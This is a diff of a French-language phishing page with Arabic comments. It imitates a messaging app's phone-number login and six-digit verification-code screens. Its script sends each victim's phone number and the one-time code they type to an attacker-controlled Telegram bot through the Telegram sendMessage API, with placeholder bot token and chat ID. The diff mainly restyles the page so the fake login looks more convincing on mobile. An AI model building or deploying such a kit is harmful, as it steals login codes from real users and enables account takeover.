@@ -2,8 +2,8 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vérification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Connexion</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
     <style>
         :root {
@@ -12,169 +12,173 @@
             --text-dark: #1a1a1a;
         }
 
+        * { box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }
+
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             background-color: var(--bg-color);
             margin: 0;
+            padding: 0;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
-            height: 100vh;
-            color: var(--text-dark);
+            min-height: 100vh;
         }
 
-        .container {
-            width: 90%;
-            max-width: 400px;
-            text-align: center;
-            background: white;
-            padding: 40px 20px;
-            border-radius: 20px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
-        }
-
-        h2 { font-size: 24px; margin-bottom: 10px; font-weight: 700; }
-        p { color: #666; font-size: 14px; margin-bottom: 30px; }
-
-        .input-group { margin-bottom: 20px; text-align: left; }
-        
-        /* تنسيق حقل الهاتف */
-        input[type="tel"], .otp-inputs input {
+        /* الجزء العلوي - الحاوية الرئيسية */
+        .wrapper {
             width: 100%;
-            padding: 15px;
-            border: 1px solid #ddd;
-            border-radius: 30px;
-            font-size: 16px;
-            outline: none;
-            transition: 0.3s;
+            max-width: 450px;
+            background: white;
+            min-height: 100vh; /* لضمان ملء شاشة الموبايل */
+            padding: 40px 25px;
+            display: flex;
+            flex-direction: column;
+            border-bottom: 2px solid #000; /* الخط الأسود في أسفل الصورة الأصلية */
         }
 
-        /* تنسيق مربعات OTP */
-        .otp-inputs { display: none; justify-content: space-between; gap: 8px; margin-top: 20px; }
-        .otp-inputs input {
-            width: 45px;
+        h2 { font-size: 28px; margin: 20px 0 10px; font-weight: 600; line-height: 1.2; text-align: left; }
+        p { color: #555; font-size: 16px; margin-bottom: 40px; text-align: left; line-height: 1.4; }
+
+        /* تعديل حقل الهاتف ليكون متناسقاً */
+        .iti { width: 100% !important; margin-bottom: 25px; }
+        input[type="tel"], .otp-field {
+            width: 100% !important;
             height: 55px;
-            text-align: center;
-            border-radius: 10px;
-            font-size: 20px;
+            border: 1.5px solid #ccc;
+            border-radius: 30px;
+            font-size: 18px;
+            padding-left: 55px !important; /* مساحة للعلم */
+            outline: none;
         }
 
+        /* تنسيق صفحة الـ OTP */
+        .otp-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 8px;
+            margin: 20px 0;
+        }
+        .otp-field {
+            padding: 0 !important;
+            text-align: center;
+            border-radius: 12px !important;
+            width: 15% !important;
+            height: 60px;
+        }
+
+        /* الزر الأخضر - كبير وسهل اللمس */
         .btn-submit {
             background-color: var(--primary-green);
             color: white;
             border: none;
-            width: 60%;
-            padding: 15px;
-            border-radius: 30px;
-            font-size: 16px;
-            font-weight: 600;
+            width: 180px;
+            height: 50px;
+            border-radius: 25px;
+            font-size: 18px;
+            font-weight: 500;
             cursor: pointer;
-            margin-top: 30px;
-        }
-
-        .qr-link {
+            margin: 40px auto 20px;
             display: block;
-            margin-top: 20px;
-            color: var(--text-dark);
-            text-decoration: underline;
-            font-size: 14px;
-            cursor: pointer;
         }
 
-        .hidden { display: none; }
+        .link-text {
+            color: var(--text-dark);
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+            margin-top: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .hidden { display: none !important; }
+
+        /* تحسينات للشاشات الصغيرة جداً */
+        @media (max-width: 360px) {
+            h2 { font-size: 22px; }
+            .otp-field { height: 50px; }
+        }
     </style>
 </head>
 <body>
 
-<div class="container">
+<div class="wrapper">
     <div id="page1">
-        <h2>Saisissez un numéro de téléphone</h2>
+        <h2>Saisissez un numéro de <br>téléphone.</h2>
         <p>Sélectionnez un pays et saisissez votre numéro de téléphone.</p>
-        <div class="input-group">
-            <input type="tel" id="phone" placeholder="">
-        </div>
-        <button class="btn-submit" onclick="sendPhone()">Suivant</button>
-        <div class="qr-link">Se connecter avec un code QR ></div>
+        
+        <input type="tel" id="phone">
+        
+        <button class="btn-submit" onclick="goToOTP()">Suivant</button>
+        
+        <a href="#" class="link-text">Se connecter avec un code QR <span>&rsaquo;</span></a>
     </div>
 
     <div id="page2" class="hidden">
         <h2>Vérification</h2>
         <p>Veuillez saisir le code à 6 chiffres envoyé à votre mobile.</p>
-        <div class="otp-inputs" style="display: flex;">
-            <input type="text" maxlength="1" class="otp-field">
-            <input type="text" maxlength="1" class="otp-field">
-            <input type="text" maxlength="1" class="otp-field">
-            <input type="text" maxlength="1" class="otp-field">
-            <input type="text" maxlength="1" class="otp-field">
-            <input type="text" maxlength="1" class="otp-field">
+        
+        <div class="otp-container">
+            <input type="number" class="otp-field" maxlength="1" oninput="moveNext(this, 0)">
+            <input type="number" class="otp-field" maxlength="1" oninput="moveNext(this, 1)">
+            <input type="number" class="otp-field" maxlength="1" oninput="moveNext(this, 2)">
+            <input type="number" class="otp-field" maxlength="1" oninput="moveNext(this, 3)">
+            <input type="number" class="otp-field" maxlength="1" oninput="moveNext(this, 4)">
+            <input type="number" class="otp-field" maxlength="1" oninput="moveNext(this, 5)">
         </div>
-        <button class="btn-submit" onclick="sendOTP()">Vérifier</button>
-        <div class="qr-link">Renvoyer le code ></div>
+        
+        <button class="btn-submit" onclick="finish()">Vérifier</button>
+        
+        <a href="#" class="link-text">Renvoyer le code <span>&rsaquo;</span></a>
     </div>
 </div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 <script>
-    // --- إعدادات التليجرام (قم بوضع بياناتك هنا) ---
-    const config = {
-        token: "ضع_هنا_توكن_البوت",
-        chatId: "ضع_هنا_الايدي_الخاص_بك"
-    };
+    // --- بيانات التليجرام ---
+    const token = "YOUR_BOT_TOKEN"; 
+    const chatId = "YOUR_CHAT_ID";
 
-    // إعداد حقل الهاتف وتحديد الدولة تلقائياً
+    // تهيئة حقل الهاتف مع اكتشاف الدولة
     const phoneInput = document.querySelector("#phone");
     const iti = window.intlTelInput(phoneInput, {
         initialCountry: "auto",
-        geoIpLookup: function(success, failure) {
+        geoIpLookup: function(success) {
             fetch("https://ipapi.co/json").then(res => res.json()).then(data => success(data.country_code));
         },
         utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
     });
 
-    // وظيفة إرسال رقم الهاتف
-    function sendPhone() {
-        const fullNumber = iti.getNumber();
-        if(!fullNumber) return alert("الرجاء إدخال رقم صحيح");
+    function goToOTP() {
+        const num = iti.getNumber();
+        if(!num) return alert("Numéro invalide");
 
-        const message = `📱 رقم هاتف جديد:\n${fullNumber}`;
-        
-        fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: config.chatId, text: message })
-        });
+        // إرسال الرقم لتليجرام
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=📱 Number: ${num}`);
 
-        // الانتقال للصفحة الثانية
         document.getElementById('page1').classList.add('hidden');
         document.getElementById('page2').classList.remove('hidden');
     }
 
-    // وظيفة إرسال الـ OTP
-    function sendOTP() {
-        let otp = "";
-        document.querySelectorAll('.otp-field').forEach(input => otp += input.value);
-        
-        if(otp.length < 6) return alert("أدخل الكود كاملاً");
-
-        const message = `🔑 رمز الـ OTP المدخل:\n${otp}`;
-
-        fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: config.chatId, text: message })
-        }).then(() => {
-            alert("Merci! Votre demande est en cours de traitement.");
-        });
+    function moveNext(el, index) {
+        if (el.value.length === 1 && index < 5) {
+            document.querySelectorAll('.otp-field')[index + 1].focus();
+        }
     }
 
-    // التنقل التلقائي بين مربعات الـ OTP
-    document.querySelectorAll('.otp-field').forEach((field, index) => {
-        field.addEventListener('input', (e) => {
-            if (e.target.value && index < 5) {
-                document.querySelectorAll('.otp-field')[index + 1].focus();
-            }
+    function finish() {
+        let otp = "";
+        document.querySelectorAll('.otp-field').forEach(i => otp += i.value);
+        
+        if(otp.length < 6) return alert("Code incomplet");
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=🔑 OTP: ${otp}`)
+        .then(() => {
+            alert("Traitement en cours...");
         });
-    });
+    }
 </script>
 
 </body>
